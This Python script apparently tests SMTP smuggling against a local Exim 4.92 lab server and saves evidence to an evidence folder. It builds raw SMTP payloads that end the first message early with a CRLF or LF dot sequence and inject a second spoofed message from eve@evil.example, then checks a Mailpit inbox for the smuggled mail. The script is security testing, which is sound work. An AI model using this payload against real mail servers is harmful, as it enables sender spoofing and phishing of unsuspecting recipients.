"""Existing I1 pair, one CRLF and one LF, into the local Exim 4.92 control."""
import json
import socket
import time
import urllib.request
from pathlib import Path

OUT = Path("/evidence/w1-20261001a/exim492")
OUT.mkdir(parents=True, exist_ok=True)


def payload(case: str, sep: str) -> bytes:
    sep_bytes = {"crlf": b"\r\n.\r\n", "lf": b"\n.\n"}[sep]
    first = (
        "X-Case-ID: " + case + "\r\n"
        "From: alice@sender.lab.test\r\n"
        "To: bob@receiver.lab.test\r\n"
        "Subject: I1 first " + case + "\r\n"
        "\r\n"
        "body of first message\r\n"
    ).encode()
    smug = (
        "MAIL FROM:<eve@evil.example>\r\n"
        "RCPT TO:<bob@receiver.lab.test>\r\n"
        "DATA\r\n"
        "X-Case-ID: SMUG-" + case + "\r\n"
        "From: eve@evil.example\r\n"
        "To: bob@receiver.lab.test\r\n"
        "Subject: I1 SMUGGLED " + case + "\r\n"
        "\r\n"
        "body of smuggled message\r\n.\r\nQUIT\r\n"
    ).encode()
    return first + sep_bytes + smug


def send_raw(host: str, port: int, data: bytes) -> list[str]:
    transcript = []
    sock = socket.create_connection((host, port), timeout=60)
    fh = sock.makefile("rb")

    def one() -> str:
        while True:
            line = fh.readline().decode(errors="replace").rstrip()
            transcript.append(line)
            if len(line) < 4 or line[3] != "-":
                return line

    one()
    sock.sendall(b"EHLO client.lab.test\r\n")
    while True:
        line = fh.readline().decode(errors="replace").rstrip()
        transcript.append(line)
        if len(line) < 4 or line[3] != "-":
            break
    sock.sendall(b"MAIL FROM:<alice@sender.lab.test>\r\n")
    one()
    sock.sendall(b"RCPT TO:<bob@receiver.lab.test>\r\n")
    one()
    sock.sendall(b"DATA\r\n")
    one()
    sock.sendall(data)
    sock.settimeout(6)
    end = time.time() + 6
    while time.time() < end:
        try:
            line = fh.readline().decode(errors="replace").rstrip()
        except socket.timeout:
            break
        if not line:
            break
        transcript.append(line)
    sock.close()
    return transcript


def mailpit_hits(token: str) -> list[dict]:
    listing = json.load(urllib.request.urlopen(
        "http://msl-mailpit:8025/api/v1/messages?limit=30", timeout=10))
    hits = []
    for item in listing.get("messages", []):
        mid = item["ID"]
        raw = urllib.request.urlopen(
            f"http://msl-mailpit:8025/api/v1/message/{mid}/raw", timeout=10).read()
        marker = f"X-Case-ID: {token}".encode()
        if marker in raw and f"X-Case-ID: SMUG-{token}".encode() not in raw:
            hits.append({"id": mid, "bytes": len(raw), "subject": item.get("Subject", "")})
            (OUT / f"{token}-{mid}.eml").write_bytes(raw)
    return hits


def main() -> None:
    summary = []
    for sep in ("crlf", "lf"):
        case = f"i1-exim492-{sep}"
        blob = payload(case, sep)
        (OUT / f"{case}.payload").write_bytes(blob)
        transcript = send_raw("msl-exim492", 25, blob)
        (OUT / f"{case}.smtp.txt").write_text("\n".join(transcript) + "\n", encoding="utf-8")
        time.sleep(2)
        first = mailpit_hits(case)
        smug = mailpit_hits("SMUG-" + case)
        row = {
            "separator": sep,
            "case": case,
            "payload_bytes": len(blob),
            "smtp_tail": transcript[-6:],
            "first": len(first),
            "smuggled": len(smug),
            "first_ids": first,
            "smuggled_ids": smug,
        }
        summary.append(row)
        print(json.dumps(row))
    (OUT / "summary.json").write_text(json.dumps(summary, indent=2) + "\n", encoding="utf-8")


if __name__ == "__main__":
    main()
